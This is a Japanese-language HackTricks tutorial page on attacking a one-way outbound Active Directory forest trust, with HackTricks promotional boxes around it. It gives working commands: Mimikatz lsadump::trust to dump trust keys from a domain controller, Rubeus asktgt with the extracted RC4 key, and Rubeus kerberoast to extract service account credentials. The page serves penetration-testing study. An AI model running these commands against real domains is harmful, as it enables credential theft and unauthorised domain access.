# External Forest Domain - One-Way (Outbound)

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝**したい場合や **HackTricks をPDFでダウンロード** したい場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェック！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass) に参加するか、**Twitter** 🐦 で **@carlospolopm** をフォローする [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングテクニックを共有するためにPRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリに。

</details>

このシナリオでは、**あなたのドメイン**が**異なるドメイン**からのプリンシパルに一部の**特権**を**委任**しています。

## 列挙

### アウトバウンドトラスト
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## 信頼アカウント攻撃

ドメイン **A** とドメイン **B** として識別される2つのドメイン間に信頼関係が確立されると、セキュリティ上の脆弱性が存在します。このセットアップでは、ドメイン **B** がドメイン **A** に対して信頼を拡張します。ここで、ドメイン **B** に関連付けられた特別なアカウントがドメイン **A** に作成され、両方のドメイン間での認証プロセスで重要な役割を果たします。この特別なアカウントは、両ドメイン間のサービスへのアクセスのためにチケットを暗号化するために使用されます。

ここで理解する重要な点は、この特別なアカウントのパスワードとハッシュを、ドメイン **A** のドメインコントローラからコマンドラインツールを使用して抽出できるということです。このアクションを実行するためのコマンドは次のとおりです：
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
この抽出は、そのアカウントが名前の後に **$** が付いて識別され、ドメイン **A** の "Domain Users" グループに属しているため、このグループに関連付けられた権限を継承しているため可能です。これにより、個人はこのアカウントの資格情報を使用してドメイン **A** に対して認証できます。

**警告:** この状況を利用して、ユーザーとしてドメイン **A** に足場を築くことは可能ですが、権限は限られています。ただし、このアクセス権限はドメイン **A** で列挙を実行するのに十分です。

信頼するドメインが `ext.local` であり、信頼されるドメインが `root.local` であるシナリオでは、`root.local` 内に `EXT$` というユーザーアカウントが作成されます。特定のツールを使用することで、Kerberos 信頼キーをダンプし、`root.local` の `EXT$` の資格情報を明らかにすることが可能です。これを達成するためのコマンドは次のとおりです:
```bash
lsadump::trust /patch
```
以下では、別のツールコマンドを使用して、`root.local`内の`root.local\EXT$`として認証するために抽出されたRC4キーを使用できます：
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
この認証ステップは、`root.local`内のサービスを列挙したり、Kerberoast攻撃を実行してサービスアカウントの資格情報を抽出する可能性を開く。
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### クリアテキスト信頼パスワードの収集

前のフローでは、**クリアテキストパスワード**（また、**mimikatzによってダンプされた**）の代わりに信頼ハッシュが使用されました。

クリアテキストパスワードは、mimikatzからの\[ CLEAR ]出力を16進数に変換し、ヌルバイト '\x00' を削除することで取得できます：

![](<../../.gitbook/assets/image (938).png>)

信頼関係を作成する際、ユーザーが信頼のためにパスワードを入力する必要がある場合があります。このデモンストレーションでは、キーは元の信頼パスワードであり、したがって人間が読めるものです。キーがサイクルする（30日間）、クリアテキストは人間が読めなくなりますが、技術的にはまだ使用可能です。

クリアテキストパスワードは、信頼アカウントのKerberosシークレットキーを使用してTGTを要求する代わりに、信頼アカウントとして通常の認証を実行するために使用できます。ここでは、ext.localからroot.localにDomain Adminsのメンバーを問い合わせています：

![](<../../.gitbook/assets/image (792).png>)

## 参考文献

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**および**HackTricks Cloud**のgithubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
